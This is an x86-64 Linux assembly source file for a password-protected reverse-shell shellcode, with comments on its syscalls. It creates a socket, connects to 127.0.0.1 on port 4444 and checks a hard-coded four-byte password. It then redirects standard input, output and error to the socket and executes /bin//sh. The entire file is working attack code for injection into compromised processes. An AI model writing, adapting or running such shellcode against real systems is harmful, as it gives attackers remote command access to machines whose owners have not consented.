global _start
_start:

; Constants
AF_INET     equ 0x2
BINSH       equ '/bin//sh'
PASSWORD    equ 'AAAA'
PORT        equ 0x5c11
SIZE_STRUCT equ 0x10
SOCK_STREAM equ 0x1

; syscalls
SYS_DUP2    equ 0x21
SYS_EXECVE  equ 0x3b
SYS_SOCKET  equ 0x29

_init_socket:
	; sock = socket(AF_INET, SOCK_STREAM, 0)
	; AF_INET = 2
	; SOCK_STREAM = 1
	; syscall number 41 

    push SYS_SOCKET
    pop rax
    push AF_INET
    pop rdi
    push SOCK_STREAM
    pop rsi
    cdq

	syscall

	; save socket
	mov rdi, rax

_init_sockaddr
	; server.sin_family = AF_INET 
	; server.sin_port = htons(PORT)
	; server.sin_addr.s_addr = inet_addr("127.0.0.1")
	; bzero(&server.sin_zero, 8)

	xor rax, rax 

    ; sin_zero
	push rax
	
    ; set ip in struct
    inc eax
    shl eax, 0x18
    add al, 0x7f
    shl rax, 0x10
    
    ; set port 4444
    add ax, 0x5c11
    shl rax, 0x10
    ; sin_family
    add al, 2
    push rax

_connect:
	; connect(sock, (struct sockaddr *)&server, sockaddr_len)
    push 42
    pop rax
	mov rsi, rsp
    push 16
    pop rdx
	syscall

_read_pw:

    sub rsi, 0x10 ; Reuse sin_zero from struct
    push 4
    pop rdx
    xor rax,rax
    syscall
    ; duplicate sockets
    ; dup2 (new, old)

_auth:
    cmp dword[rsi], PASSWORD
    jne _burn
        
_dup2:
    ; dup2(client, STDIN)
    ; dup2(client, STDOUT)
    ; dup2(client, STERR)

    push 3 
    pop rsi

    _loop:

    dec esi
    push SYS_DUP2
    pop rax
    SYSCALL

    jne _loop

_execve:
    ; execve
    
    xor rax, rax
    push rax
    mov rbx, 0x68732f2f6e69622f
    push rbx
    mov rdi, rsp
    push rax
    mov rdx, rsp
    push rdi
    mov rsi, rsp
    add rax, 59
    syscall
 
_burn:
